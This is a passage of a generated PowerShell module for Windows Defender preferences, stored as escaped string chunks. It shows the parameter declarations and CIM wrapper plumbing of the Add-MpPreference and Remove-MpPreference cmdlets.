$__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-MpPreference' -Alias '*'\r\n        \r\n\r\nfunction Add-MpPreference\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionPath},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionExtension},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionProcess},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionIpAddress},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('tiddefaci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [long[]]\r\n    ${ThreatIDDefaultAction_Ids},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('tiddefaca')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]\r\n    ${ThreatIDDefaultAction_Actions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionOnlyExclusions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessAllowedApplications},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledF"
"olderAccessProtectedFolders},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionRules_Ids},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]\r\n    ${AttackSurfaceReductionRules_Actions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('repe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${RemoteEncryptionProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('bfpe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${BruteForceProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [switch]\r\n    ${Force},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {\r\n          [object]$__cmdletization_value = ${ExclusionPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {\r\n          [object]$__cmdletization_value = ${ExclusionExtension}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {\r\n          [object]$__cmdletization_value = ${ExclusionProcess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {\r\n          [object]$__cmdletization_value = ${ExclusionIpAddress}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions_Id')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $tru"
"e}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Add', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Add-MpPreference' -Alias '*'\r\n        \r\n\r\nfunction Remove-MpPreference\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionPath},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionExtension},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionProcess},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionIpAddress},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rtsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RealTimeScanDirection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('qpiad')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${QuarantinePurgeItemsAfterDelay},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemediationScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemediationScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('repcs')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemoteEncryptionProtectionConfiguredState},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('repmbt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemoteEncryptionProtectionMaxBlockTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('repa')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemoteEncryptionProtectionAggressiveness},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('repe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${RemoteEncryptionProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('bfpcs')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${BruteForceProtectionConfiguredState},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('bfpmbt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${BruteForceProtectionMaxBlockTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('bfpa')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${BruteForceProtectionAggressiveness},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('bfpe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${BruteForceProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('raat')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ReportingAdditionalActionTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rcto')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ReportingCriticalFailureTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rncto')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ReportingNonCriticalTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('shri')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ServiceHealthReportInterval},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rdsde')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ReportDynamicSignatureDroppedEvent},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('saclf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanAvgCPULoadFactor},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('csbr')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${CheckForSignaturesBeforeRunningScan},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('spiad')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanPurgeItemsAfterDelay},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('soiie')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanOnlyIfIdleEnabled},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanParameters},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('scsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('scsqst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanScheduleQuickScanTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('scst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('tfsso')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ThrottleForScheduledScanOnly},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigfagp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureFirstAuGracePeriod},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigagp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureAuGracePeriod},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigdufss')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureDefinitionUpdateFileSharesSources},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigduoswo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureDisableUpdateOnStartupWithoutEngine},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sfo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureFallbackOrder},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ssp','SecurityIntelligenceLocation','ssl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SharedSignaturesPath},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sspsch','SecurityIntelligenceLocationUpdateAtScheduledTimeOnly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SharedSignaturesPathUpdateAtScheduledTimeOnly},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureScheduleDay},\r\n\r\n    